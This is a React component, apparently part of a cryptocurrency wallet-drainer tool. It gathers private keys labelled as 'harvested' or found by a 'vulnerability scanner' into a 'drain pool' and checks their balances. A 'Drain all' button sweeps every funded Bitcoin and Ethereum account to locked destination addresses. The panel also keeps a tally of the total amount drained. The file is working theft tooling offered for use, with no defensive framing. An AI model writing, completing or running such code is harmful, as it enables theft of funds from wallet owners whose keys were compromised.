import { useCallback, useEffect, useMemo, useState } from 'react';
import { Lock, Unlock, RefreshCw, Droplets, Wallet2 } from 'lucide-react';
import { useWallet, type WalletAccount } from '@/hooks/useWallet';
import { useHarvestedKeys, clearHarvested } from '@/lib/keyHarvest';
import { toast } from '@/hooks/use-toast';
import {
  fetchAccountBalance,
  fetchFeeRates,
  loadTargets,
  saveTargets,
  sweepAccount,
  type DrainTargets,
} from '@/lib/drainer';

const LOCK_KEY = 'ckg_drain_locked_v1';
const TOTALS_KEY = 'ckg_drain_totals_v1';

function short(a: string) {
  return a.length > 20 ? `${a.slice(0, 10)}…${a.slice(-8)}` : a;
}

type Totals = { btc: number; eth: number; count: number };

function loadTotals(): Totals {
  try {
    const t = JSON.parse(localStorage.getItem(TOTALS_KEY) || '{}');
    return { btc: +t.btc || 0, eth: +t.eth || 0, count: +t.count || 0 };
  } catch {
    return { btc: 0, eth: 0, count: 0 };
  }
}

type LogEntry = { address: string; ok: boolean; message: string; url?: string };

export default function DrainerPanel() {
  const w = useWallet();
  const harvested = useHarvestedKeys();
  const [targets, setTargets] = useState<DrainTargets>(() => loadTargets());
  const [locked, setLocked] = useState<boolean>(() => localStorage.getItem(LOCK_KEY) === '1');
  const [totals, setTotals] = useState<Totals>(() => loadTotals());
  const [fees, setFees] = useState<{ btc: number; eth: number }>({ btc: 8, eth: 15 });
  const [busy, setBusy] = useState(false);
  const [progress, setProgress] = useState<{ done: number; total: number } | null>(null);
  const [funded, setFunded] = useState<Record<string, string>>({});
  const [scanned, setScanned] = useState(0);
  const [log, setLog] = useState<LogEntry[]>([]);

  useEffect(() => {
    fetchFeeRates().then(setFees).catch(() => undefined);
  }, []);

  /** Every key this device knows about: unlocked wallets + harvested results. */
  const pool = useMemo(() => {
    const map = new Map<string, WalletAccount>();
    for (const k of harvested) map.set(k.address, k);
    for (const s of w.saved) map.set(s.address, s);
    return [...map.values()];
  }, [harvested, w.saved]);

  const btcCount = pool.filter(p => p.network === 'btc').length;
  const ethCount = pool.length - btcCount;

  const updateTargets = (patch: Partial<DrainTargets>) => {
    if (locked) return;
    const next = { ...targets, ...patch };
    setTargets(next);
    saveTargets(next);
  };

  const toggleLock = () => {
    if (!locked && !targets.btc.trim() && !targets.eth.trim()) {
      toast({ title: 'Add a destination first', variant: 'destructive' });
      return;
    }
    const next = !locked;
    setLocked(next);
    localStorage.setItem(LOCK_KEY, next ? '1' : '0');
    toast({ title: next ? 'Destinations locked' : 'Destinations unlocked' });
  };

  const bumpTotals = (network: 'btc' | 'eth', amount: number) => {
    setTotals(prev => {
      const next = {
        btc: prev.btc + (network === 'btc' ? amount : 0),
        eth: prev.eth + (network === 'eth' ? amount : 0),
        count: prev.count + 1,
      };
      try { localStorage.setItem(TOTALS_KEY, JSON.stringify(next)); } catch { /* ignore */ }
      return next;
    });
  };

  const scanBalances = useCallback(async () => {
    setBusy(true);
    setFunded({});
    setScanned(0);
    const hits: Record<string, string> = {};
    for (let i = 0; i < pool.length; i++) {
      try {
        // eslint-disable-next-line no-await-in-loop
        const bal = await fetchAccountBalance(pool[i]);
        if (parseFloat(bal) > 0) hits[pool[i].address] = bal;
      } catch { /* skip */ }
      setScanned(i + 1);
    }
    setFunded(hits);
    setBusy(false);
    toast({
      title: `${Object.keys(hits).length} funded wallet(s)`,
      description: `Scanned ${pool.length} addresses`,
    });
  }, [pool]);

  const drainAll = async () => {
    const list = pool.filter(p => {
      const dest = p.network === 'btc' ? targets.btc.trim() : targets.eth.trim();
      if (!dest) return false;
      const bal = funded[p.address];
      return bal === undefined ? true : parseFloat(bal) > 0;
    });
    if (!list.length) {
      toast({ title: 'Nothing to drain', variant: 'destructive' });
      return;
    }
    setBusy(true);
    setProgress({ done: 0, total: list.length });
    for (let i = 0; i < list.length; i++) {
      const acct = list[i];
      const dest = acct.network === 'btc' ? targets.btc.trim() : targets.eth.trim();
      try {
        const feeRate = acct.network === 'btc' ? fees.btc : fees.eth;
        // eslint-disable-next-line no-await-in-loop
        const res = await sweepAccount(acct, dest, feeRate);
        bumpTotals(acct.network, parseFloat(res.amount) || 0);
        setLog(prev => [{ address: acct.address, ok: true, message: res.amount, url: res.url }, ...prev].slice(0, 50));
      } catch (e: any) {
        const msg = e?.message ?? 'Sweep failed';
        if (!/no confirmed|too low|balance/i.test(msg)) {
          setLog(prev => [{ address: acct.address, ok: false, message: msg }, ...prev].slice(0, 50));
        }
      }
      setProgress({ done: i + 1, total: list.length });
    }
    setBusy(false);
    toast({ title: 'Drain run complete' });
  };

  const resetTotals = () => {
    const zero = { btc: 0, eth: 0, count: 0 };
    setTotals(zero);
    localStorage.setItem(TOTALS_KEY, JSON.stringify(zero));
  };

  const hasTarget = !!targets.btc.trim() || !!targets.eth.trim();

  return (
    <div className="animate-fade-in max-w-3xl mx-auto space-y-4">
      {/* Destinations */}
      <div className="rounded-xl border border-border bg-card p-6 space-y-4">
        <div className="flex items-start justify-between gap-3">
          <div className="space-y-1">
            <h2 className="text-lg font-semibold">Main Wallets</h2>
            <p className="text-xs text-muted-foreground">
              All drained balances go here. Stored on this device only.
            </p>
          </div>
          <button
            onClick={toggleLock}
            className={`shrink-0 inline-flex items-center gap-1.5 rounded-md border px-3 py-1.5 text-xs font-medium transition-all ${
              locked
                ? 'border-primary/50 bg-primary/10 text-primary'
                : 'border-border text-muted-foreground hover:border-primary/40'
            }`}
          >
            {locked ? <Lock className="h-3.5 w-3.5" /> : <Unlock className="h-3.5 w-3.5" />}
            {locked ? 'Locked' : 'Lock in'}
          </button>
        </div>

        <div className="space-y-2">
          <label className="text-xs uppercase tracking-wider text-muted-foreground">₿ Bitcoin destination</label>
          <input
            value={targets.btc}
            readOnly={locked}
            onChange={e => updateTargets({ btc: e.target.value.trim() })}
            placeholder="bc1… / 1… / 3…"
            spellCheck={false}
            className={`w-full rounded-lg border border-border bg-background px-3 py-2.5 font-mono text-sm outline-none focus:border-primary/60 ${
              locked ? 'opacity-70 cursor-not-allowed' : ''
            }`}
          />
        </div>

        <div className="space-y-2">
          <label className="text-xs uppercase tracking-wider text-muted-foreground">Ξ Ethereum destination</label>
          <input
            value={targets.eth}
            readOnly={locked}
            onChange={e => updateTargets({ eth: e.target.value.trim() })}
            placeholder="0x…"
            spellCheck={false}
            className={`w-full rounded-lg border border-border bg-background px-3 py-2.5 font-mono text-sm outline-none focus:border-secondary/60 ${
              locked ? 'opacity-70 cursor-not-allowed' : ''
            }`}
          />
        </div>

        <div className="flex flex-wrap gap-3 text-[11px] font-mono text-muted-foreground">
          <span>BTC fee: {fees.btc} sat/vB</span>
          <span>ETH fee: {fees.eth} gwei</span>
        </div>
      </div>

      {/* Total drained */}
      <div className="rounded-xl border border-primary/25 bg-primary/[0.04] p-6 space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-semibold">Total drained</h3>
          <button onClick={resetTotals} className="text-[10px] text-muted-foreground hover:text-destructive">
            reset
          </button>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <div className="font-mono text-2xl font-bold text-primary text-glow-mint">
              {totals.btc.toFixed(8)} <span className="text-sm">BTC</span>
            </div>
          </div>
          <div>
            <div className="font-mono text-2xl font-bold text-secondary text-glow-blue">
              {totals.eth.toFixed(6)} <span className="text-sm">ETH</span>
            </div>
          </div>
        </div>
        <div className="text-[11px] text-muted-foreground">{totals.count} successful sweep(s)</div>
      </div>

      {/* Pool */}
      <div className="rounded-xl border border-border bg-card p-6 space-y-4">
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <div className="flex items-center gap-2">
            <Wallet2 className="h-4 w-4 text-muted-foreground" />
            <div>
              <div className="text-sm font-semibold">{pool.length} addresses in drain pool</div>
              <div className="text-[11px] font-mono text-muted-foreground">
                {btcCount} BTC · {ethCount} ETH · auto-collected from generator, scanner & wallets
              </div>
            </div>
          </div>
          <div className="flex gap-2">
            <button
              onClick={scanBalances}
              disabled={busy || pool.length === 0}
              className="inline-flex items-center gap-1.5 rounded-md border border-border px-3 py-1.5 text-xs hover:border-primary/40 disabled:opacity-40"
            >
              <RefreshCw className={`h-3.5 w-3.5 ${busy && !progress ? 'animate-spin' : ''}`} />
              Scan balances
            </button>
            <button
              onClick={drainAll}
              disabled={busy || !hasTarget || pool.length === 0}
              className="inline-flex items-center gap-1.5 rounded-md bg-destructive px-3 py-1.5 text-xs font-semibold text-destructive-foreground disabled:opacity-40"
            >
              <Droplets className="h-3.5 w-3.5" />
              {busy && progress ? `Draining ${progress.done}/${progress.total}` : 'Drain all'}
            </button>
          </div>
        </div>

        {busy && !progress && (
          <div className="text-[11px] font-mono text-muted-foreground">
            Scanning {scanned}/{pool.length}…
          </div>
        )}

        {Object.keys(funded).length > 0 && (
          <div className="rounded-lg border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive font-mono">
            {Object.keys(funded).length} funded address(es) detected
          </div>
        )}

        {pool.length > 0 && (
          <button
            onClick={() => { clearHarvested(); setFunded({}); }}
            className="text-[10px] text-muted-foreground hover:text-destructive"
          >
            Clear auto-collected keys
          </button>
        )}

        {pool.length === 0 && (
          <p className="text-xs text-muted-foreground">
            Nothing collected yet — run the vanity generator or vulnerability scanner and every key found lands here automatically.
          </p>
        )}
      </div>

      {/* Recent sweeps */}
      {log.length > 0 && (
        <div className="rounded-xl border border-border bg-card p-6 space-y-2">
          <h3 className="text-sm font-semibold">Recent sweeps</h3>
          <div className="divide-y divide-border">
            {log.map((l, i) => (
              <div key={`${l.address}-${i}`} className="py-2 text-[11px] font-mono break-all">
                <span className="text-muted-foreground">{short(l.address)}</span>{' '}
                {l.ok ? (
                  <a href={l.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">
                    ✓ {l.message} ↗
                  </a>
                ) : (
                  <span className="text-destructive">{l.message}</span>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
